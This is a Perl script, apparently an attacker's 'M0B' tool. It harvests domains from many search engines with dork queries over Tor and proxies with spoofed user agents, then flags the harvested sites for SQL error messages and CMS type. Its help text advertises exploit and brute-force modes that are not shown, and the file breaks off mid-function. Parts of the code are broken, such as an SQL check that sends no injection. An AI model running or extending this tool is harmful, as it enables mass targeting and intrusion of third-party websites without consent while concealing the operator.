#############################
#   Tool for educational    #
#       purpose only        #
#        created by         #        
#    M0B - Mobrine hayde    #
#############################

#!usr/bin/perl

######################
#                    #
#    M0B             #
#      Scan tool     #
#                    #
######################
####################################
use LWP::UserAgent;  		   #
use HTTP::Request;   		   #
use Term::ANSIColor; 		   #
use IO::Socket;                    #
use IO::Socket::INET;              #
use Term::ANSIColor;               #
use URI::URL;                      #
use HTTP::Cookies;                 #
use POSIX qw(uname);		   # 
use HTTP::Request::Common qw(POST);#
use HTTP::Request::Common qw(GET); #
####################################
#################################### DONT TOUCH THIS / TOUCH THIS IF YOU WANT
######################################################################################################
##################################### for search engines #############################################
############################## User agent with tor proxy
$ag = LWP::UserAgent->new();
$ag->agent("$us1");
$ag->proxy([qw/ http https /] => 'socks://localhost:9050'); # Tor proxy
$ag->cookie_jar({});
############################## Normal User agent
$ag1 = LWP::UserAgent->new();
$ag1->agent("$us1");
############################## User agent with japanese proxy ( for livedoor & rakuten )
$jpr = "put japanese proxy here";
$aj = LWP::UserAgent->new();
$aj->agent("$us1");
$aj->proxy([qw/ http https /] => "http://$jpr"); # japanese proxy
$aj->cookie_jar({});
##################################### for exploit #################################################### coming soon sorry for the long wait
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
##################################### auto add folders
$BruteForce="BruteForce";
    if (-e $BruteForce) 
    {
    }
    else
    {
        mkdir $BruteForce or die "Error creating directory: $BruteForce";
    }

$BruteForce="BruteForce";
    if (-e $BruteForce) 
    {
    }
    else
    {
        mkdir $BruteForce or die "Error creating directory: $BruteForce";
    }
	$rez="rez";
    if (-e $rez) 
    {
    }
    else
    {
        mkdir $rez or die "Error creating directory: $rez";
    }
	
$cms="cms";
    if (-e $cms) 
    {
    }
    else
    {
        mkdir $cms or die "Error creating directory: $cms";
    }
	
$sql="sql";
    if (-e $sql) 
    {
    }
    else
    {
        mkdir $sql or die "Error creating directory: $sql";
    }
######################################################################################################
$oni=("
	##     ##   #####   ########  
	###   ###  ##   ##  ##     ## 
	#### #### ##     ## ##     ## 
	## ### ## ##     ## ########  
	##     ## ##     ## ##     ## 
	##     ##  ##   ##  ##     ## 
	##     ##   #####   ########  
");
variables();
main();
sub uname {
	 print("[+] UNAME: ");
my @uname = uname();
print $uname[0] . " " . $uname[2];
}
sub help {
     	system('cls');
if ( @uname =~ Linux ) {    #for linux os
	 system("clear");
     system('M0B tool v1');
	 }
     print colored("$oni\n",'blue');
     print " \n\n      M0B tool v1";
     print " \n            created by M0B \n\n";
	print "\n[!] Usage : perl $0 <argument>\n";
	print "\n"; 
	print " --m         |select search engine you want.\n";
	print "             |ex : perl $0 --m baidu ...\n";
	print "             |or you can also use all engines\n";
	print "             |ex : perl $0 --m all ...\n";
	print "             |Valid search engines: baidu, bing, livedoor,\n";
	print "             |sogou, oscobo, mywebsearch, teoma, rakuten\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --d         |dork to scan.\n";
	print "             |ex : perl $0 --m baidu --d book.php?id=\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --o         |Output file to save dork scan results.\n";
	print "             |Remarque : all results gonna be saved automatically\n";
	print "             |in /result\n";
	print "-------------+-------------------------------------------------------------\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --sql       |scan a list of sites.\n";
	print "             |find sql injections \n";
	print "-------------+-------------------------------------------------------------\n";
	print " --scan      |scan a list of sites.\n";
	print "             |scan CMS \n";
	print "-------------+-------------------------------------------------------------\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --portscan  |scan a ip ports.\n";
	print "-------------+-------------------------------------------------------------\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --ex        |exploit bot [DRUPAL - ZENCART] [MORE COMING SOON]\n";
	print "-------------+-------------------------------------------------------------\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --br        |brute force [WORDPRESS - JOOMLA - DRUPAL - MAGENTO - OPENCART]\n";
	print " --lp        |password list for brute force [ if you don't have use passwords.txt ]\n";
	print "---------------------------------------------------------------------------\n";
	exit();
}
sub main{
     system('cls');
if ( @uname =~ Linux ) {    #for linux os
	 system("clear");
     system('M0B tool v1');
	 }
     print colored("$oni\n",'blue');
     print " \n\n      M0B tool v1";
     print " \n            created by M0B \n\n";
     if (@ARGV<1){print "\n[!] For Help : perl $0 --help\n\n\n" ;
	 }
	}

sub variables
{
     my $i=0;
     foreach (@ARGV)
     {
#
######################## user agent
@auser = ("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
	"Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3) Gecko/20100401 AskTbMPC2/3.12.5.17640 Firefox/3.6.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; es-US; rv:1.9.2.27) Gecko/20120216 Firefox/3.6.27",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.24) Gecko/20111109 CentOS/3.6-3.el5.centos Firefox/3.6.24",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 GTB7.1 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.9; en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20120306 Firefox/3.6.28",
"Mozilla/5.0 ((Windows; U; Windows NT 6.1; fr; rv:1.9.2) Gecko/20100115 Firefox/3.6)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2) Gecko/20100115 Ubuntu/10.04 (lucid) Firefox/3.6",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 AskTbORJ/3.15.25.36191 Firefox/3.6.28",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.11) Gecko/20101016 Firefox/3.6.66 GTB7",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-GB; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20101005 Fedora/3.6.10-1.fc14 Firefox/3.6.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/20100628 Firefox/3.6.6",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2) Gecko/20100115 Firefox/3.6 GTB6",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 GTB7.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.26) Gecko/20120128 BTRS25104 Firefox/3.6.26 ( .NET CLR 3.5.30729; .NET4.0E)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; it; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; pt-PT; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.10) Gecko/20100914 AskTbORJ/3.15.25.36191 Firefox/3.6.10",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.20) Gecko/20110818 SUSE/3.6.20-0.2.1 Firefox/3.6.20",
"Mozilla/5.0 (X11; U; SunOS sun4u; pl-PL; rv:1.9.1b5pre) Gecko/20100403 Firefox/3.6.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 Gecko/20100527 Firefox/3.6.4 EvoHtmlToPdf/2.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 GTB7.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 AlexaToolbar/amznf-3.0.20120501",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.12) Gecko/20101026 SUSE/3.6.12-0.6.1 Firefox/3.6.12",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.6) Gecko/20100625 LBEXG/1.0.9 AskTbORJ/3.15.25.36191 BRI/1 Firefox/3.6.6",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.39) Gecko/20101203 Firefox/3.6.12 (.NET CLR 3.5.30733)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; fa; rv:1.9.1.4) Gecko/20100513 Firefox/3.6.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 GTB7.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; uk; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 WebMoney Advisor",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 ( .NET CLR 3.5.30729; .NET4.0C)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.17) Gecko/20110421 Red Hat/3.6.17-1.el6_0 Firefox/3.6.17",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17",
"Mozilla/5.0 (X11; U; Linux x86_64; en-NZ; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16",
"Mozilla/5.0 (X11; U; Linux i686; es-MX; rv:1.9.2.17) Gecko/20110422 Ubuntu/10.04 (lucid) Firefox/3.6.17",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; es-AR; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.12 XF_mmhpset");
$us1 = $auser[rand @auser];
################### my baby my wife
@country =('com',
	   'ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao',
           'aq', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb',
           'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn', 'bo',
           'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd',
           'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr',
           'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do',
           'dz', 'ec', 'ee', 'eg', 'eh', 'er', 'es', 'et', 'eu', 'fi',
           'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf',
           'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'gs',
           'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu',
           'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'ir', 'is', 'it',
           'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn',
           'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk',
           'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me',
           'mg', 'mh', 'mk', 'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr',
           'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'nc',
           'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz',
           'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn',
           'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru',
           'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj',
           'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy',
           'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm',
           'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug',
           'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi',
           'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw', 'com',
           'net', 'org','biz', 'gov', 'mil', 'edu', 'info', 'int', 'tel',
           'name', 'aero', 'xxx','asia', 'cat', 'coop', 'jobs', 'mobi', 'museum',
           'pro', 'travel','fr','net','edu','gov','info','Balcan','xxx','edu', 'gov', 'mil',
           'biz', 'cat', 'com', 'int','net', 'org', 'pro', 'tel', 'aero', 'asia',
           'coop', 'info', 'jobs', 'mobi', 'name', 'museum', 'travel');
######################## !~
$att="q=|0day|pastebin|\/\/t.co|google.|youtube.|jsuol.com|.radio.uol.|b.uol.|barra.uol.|whowhere.|hotbot.|amesville.|lycos|lygo.|orkut.|schema.|blogger.|bing.|w3.|yahoo.|yimg.|
                creativecommons.org|ndj6p3asftxboa7j.|.torproject.org|.lygo.com|.apache.org|live.|microsoft.|ask.|shifen.com|answers.|analytics.|googleadservices.|sapo.pt|favicon.|
                blogspot.|wordpress.|.css|scripts.js|jquery-1.|dmoz.|gigablast.|aol.|.macromedia.com|.sitepoint.|yandex.|www.tor2web.org|.securityfocus.com|.Bootstrap.|.metasploit.com|
                aolcdn.|altavista.|clusty.|teoma.|baiducontent.com|wisenut.|a9.|uolhost.|w3schools.|msn.|baidu.|hao123.|shifen.|procog.|facebook.|twitter.|flickr.|.adobe.com|oficinadanet.|
                elephantjmjqepsw.|.duckduckgo.io|kbhpodhnfxl3clb4|.scanalert.com|.prototype.|feedback.core|4shared.|.KeyCodeTab|.style.|www\/cache\/i1|.className.|=n.|a.Ke=|Y.config|
                .goodsearch.com|127.0.0.1|style.top|n.Img|n.canvas.|t.search|Y.Search.|a.href|a.currentStyle|a.style|yastatic.|.oth.net|.hotbot.com|.zhongsou.com|ezilon.com|.example.com|location.href|
                .navigation.|.hostname.|.bingj.com|Y.Mobile.|srpcache?p|stackoverflow.|shifen.|baidu.|baiducontent.|gstatic.|php.net|wikipedia.|webcache.|inurl.|naver.|navercorp.|windows.|
                window.|.devmedia|imasters.|.inspcloud.com|.lycos.com|.scorecardresearch.com|.target.|JQuery.min|Element.location.|document.|exploit-db|packetstormsecurity.|1337day|owasp|
                .sun.com|mobile10.dtd|onabort=function|inurl.com.br|purl.org|.dartsearch.net|r.cb|.classList.|.pt_BR.|github|microsofttranslator.com|.compete.com|.sogou.com|gmail.|blackle.com|
                boorow.com|gravatar.com|cookieSet|security|facebook|WindowsLiveTranslator|cache|74.125.153.132|inurl:|Network|adw.sapo|tripadvisor|yandex|Failed|tumblr.|wiki|inciclopedia.|
                sogoucdn.com|weixin.|snapshot.";
				
################ arguments
     if ($ARGV[$i] eq "--m"){$search_motor = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--d"){$search_dork = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--o"){$search_output = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--scan"){$search_scan = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--sql"){$search_sql = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--portscan"){$ip_scan = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--ex"){$ex_list = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--br"){$br_list = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--lp"){$pass = $ARGV[$i+1]}
	 if ($ARGV[$i] eq "--help"){$help = &help}
     $i++;
	 }
	 }
########################### redirect
	 if (defined($search_motor))
{
     print "[+] STARTING DORK SCAN\n" ;
     print "[+] DORK TO SCAN : $search_dork\n\n\n" ;
redork();
}

sub redork {
if (not defined($search_dork)) {
print colored ("[+]You haven't writed dork yet!\n\n","white on_red");
}

if ($search_motor !~ /teoma|oscobo|mywebsearch|sogou|baidu|rakuten|livedoor|bing|all/) {
print colored ("[+]Your search engine isn't good / doesn't exist in our list\n\n","white on_red");
exit;
}


print "[+] How want you scan your dork?\n\n";
print "[1] Scan my dork normally\n";
print "[2] Scan my dork with domains\n\n";

$number=<STDIN>;
chomp $number;
print "\n\n";
if($number eq '1'){
hitoridork();
}
if($number eq '2'){
domaindork();
}
if($number !~ /1|2/){
print "AHO DESU KA?\n\n";
redork();
}
}

sub domaindork {
OUTER: foreach $country(@country){
chomp $country;
if($number eq '2'){ # with domains
$dork="$search_dork+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("white"),"$country]\n";
print color('reset');
motors();
}
}
presento();
}

sub hitoridork {
$dork="$search_dork";
motors();
presento();
}


sub motors {
if ($search_motor =~ all) {
bing(),livedoor(),rakuten(),baidu(),sogou(),mywebsearch(),oscobo(),teoma(),
}
elsif ($search_motor =~ bing) {
bing();
}
elsif ($search_motor =~ livedoor) {
livedoor();
}
elsif ($search_motor =~ rakuten) {
rakuten();
}
elsif ($search_motor =~ baidu) {
baidu();
}
elsif ($search_motor =~ sogou) {
sogou();
}
elsif ($search_motor =~ mywebsearch) {
mywebsearch();
}
elsif ($search_motor =~ oscobo) {
oscobo();
}
elsif ($search_motor =~ teoma) {
teoma();
}

}
sub presento {
############## special service if you have defined a output file wahahaha
if (defined($search_output)) {
sercl();
}
}
sub oscobo {
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "https://www.oscobo.com/search.php?is=$ii&q=$dork";


$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content !~ m/rel=\"nofollow\"/g) {$ii = 2000};

while($rrs =~ m/href=\"http:\/\/(.*?)\"/g){



$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http:///' . "$link" . '/';
       }



if($link !~ /<|>|\"|\?|\=|index\.php/){
$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$link =~ s/\/\//\//g;
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/oscobo.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}
sub mywebsearch {
for ($ii = 1; $ii <= 2000; $ii+=1){

$url = "https://int.search.mywebsearch.com/mywebsearch/GGweb.jhtml?searchfor=$dork&pn=$ii";


$resp = $ag1->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content =~ m/did not match with any results./i) {$ii = 2000};

while($rrs =~ m/href=\"http:\/\/(.*?)\"/g){


$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/mywebsearch.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}
sub teoma {
for ($ii = 1; $ii <= 2000; $ii+=1){

$url = "http://www.teoma.com/web?q=$dork&tpr=10&page=$ii";
$resp = $ag1->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content =~ m/did not match with any results./i) {$ii = 2000};

while($rrs =~ m/href=\"http:\/\/(.*?)\"/g){



$link = $1;
  if ( $link !~ /$att|teoma/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|>|<|\?|\=|index\.php/){
$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/teoma.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}

sub bing(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag1->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(save, '>>result/bing.txt');
    print save "$link\n";
    close(save);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}
sub sogou {
for ($ii = 1; $ii <= 45; $ii+=1){

$url = "http://www.sogou.com/web?query=$dork&page=$ii&ie=utf8";


$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content =~ m/相关的网页。/i) {$ii = 45};

while($rrs =~ m/href=\"http:\/\/(.*?)\" id=/g){


$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/sogou.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}

sub rakuten {
for ($ii = 0; $ii <= 200000; $ii+=10){
$aj = LWP::UserAgent->new();
$aj->agent("$us1");
$aj->proxy([qw/ http https /] => "http://$jpr"); # japanese proxy
$aj->cookie_jar({});

$url = "https://websearch.rakuten.co.jp/Web?qt=$dork&st=$ii";
$resp = $aj->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content =~ m/検索キーワードに該当するページがありません。/i) {$ii = 200000};

while($rrs =~ m/http:\/\/([^>]*)\//g){



$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /<|>|\"|\?|\=|index\.php|example|localhost|yoursite| |yourdomain/){
	$link =~ s/href=\"?http:\/\///;
	$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/rakuten.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}

sub baidu{
for ($ii = 0; $ii <= 500; $ii+=10){

$url = "http://www.baidu.com/s?wd=$dork&pn=$ii";
$resp = $ag1->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;


while($rrs =~ m/style=\"text-decoration:none;\">(.*?)<\/a>/g){

$link = $1;


  if ( $link !~ /$att/)
  {
        if ($link !~ /^https:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /<|>|\"|\?|\=|index\.php|example|localhost|yoursite|http:\/\/\/|yourdomain/){
	$link =~ s/href=\"?http:\/\///;
	$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
if($link !~ /...&nbsp;/){
	if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/baidu.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
} 

            push(@result,$link);
}
}
}
}
}
}
}

sub livedoor{
for ($ii = 1; $ii <= 200000; $ii+=1){


$url = "http://search.livedoor.com/search?q=$dork&search_btn=results&p=$ii";
$resp = $aj->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content =~ m/検索結果がありません。/i) {$ii = 200000};

while($rrs =~ m/http:\/\/(.*?)\"/g){



$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }

if($link !~ /<|>|\"|\?|\=|index\.php|example|localhost|yoursite|http:\/\/\/|yourdomain/){

	$link =~ s/href=\"?http:\/\///;
	$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;

	if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/livedoor.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
} 
            push(@result,$link);
}
}
}
}
}
}
####################################
######## special service ;) ########
sub sercl {
print "\n\n[+] Your dork scan is finished , Can AUTO-M0B help you?\n\n";
print "[1] Do a cms scan for your list ?\n";
print "[2] Find sql injection ?\n";
print "[3] Leave me alone !!\n\n";

$number=<STDIN>;
chomp $number;
if($number eq '1'){
$search_scan = "$search_output";
scan();
}
if($number eq '2'){
$search_sql = "$search_output";
sql();
}
if($number eq '3'){
exit;
}
if($number !~ /1|2|3/){
print "AHO DESU KA?\n\n";
sercl();
}
}
####################################
################ sql ###############
####################################
	 if (defined($search_sql))
{
     print "[+] SCANNING SITES\n" ;
     print "[+] LIST TO SCAN : $search_sql\n\n\n" ;
sql();
} 
sub sql {

open (search_sql, "<$search_sql") || die "\n YOUR LIST IS NOT FOUND\n\n";
my @search_sql = <search_sql>;
close search_sql;
 
foreach $site(@search_sql) {
 
if($site !~ /http:\/\//) { $site = "http://$site/"; };
sqldetect();
}
sub sqldetect($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent($auser[rand @auser]);
$ua->timeout (8);
 
#################### time work
my $check = $ua->get("$site")->content;
################### cms
print "SITE:";
print "$site\n";

if($check =~/You have an error in your SQL syntax|Query failed|SQL query failed|mysql_fetch_|mysql_fetch_array|mysql_num_rows|The used SELECT statements have a different number of columns/) {
print "[!] MySQL Vulnerable\n";
if($number eq '1'){open(save, '>>sql/mySQL-Vuln.txt');
    print save "$site";
    close(save);}
}
elsif($check =~/ODBC SQL Server Driver/) {
print "[!] MySQL Vulnerable\n";
if($number eq '1'){open(save, '>>sql/mySQL-Vuln.txt');
    print save "$site";
    close(save);}
}
elsif($check =~/Microsoft JET Database|ODBC Microsoft Access Driver/) {
print "[!] MS Access Vulnerable\n";
if($number eq '1'){open(save, '>>sql/msaccess-Vuln.txt');
    print save "$site";
    close(save);}
}
elsif($check =~/You have an error in your SQL|Warning: mysql_|function.mysql|MySQL result index|MySQL Error|MySQL ODBC|MySQL Driver|mysqli.query|num_rows|mysql error:/) {
print "[!] MySQL Vulnerable\n";
if($number eq '1'){open(save, '>>sql/mySQL-ERROR.txt');
    print save "$site";
    close(save);}
}
else {
print "[!] MySQL NOT Vulnerable\n";
}
print "==================================================================================================\n";
}
print "\n\n[+] Would you save results in output file?\n\n";
print "[1] YES\n";
print "[2] NO\n";
$number=<STDIN>;
chomp $number;
if($number eq '2'){
exit;
}

}
####################################
############### scan ###############
####################################
	 if (defined($search_scan))
{
     print "[+] SCANNING SITES\n" ;
     print "[+] LIST TO SCAN : $search_scan\n\n\n" ;
scan();
}
sub scan {

open (search_scan, "<$search_scan") || die "\n YOUR LIST IS NOT FOUND\n\n";
my @search_scan = <search_scan>;
close search_scan;
 
foreach $site(@search_scan) {
 
if($site !~ /http:\/\//) { $site = "http://$site/"; };
scandetect();
}
sub scandetect($site){
################################ all cms #########################
my $V_WP=("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress|<meta name=\"generator\" content=\"WordPress|\/wp-content\/(.*).js");
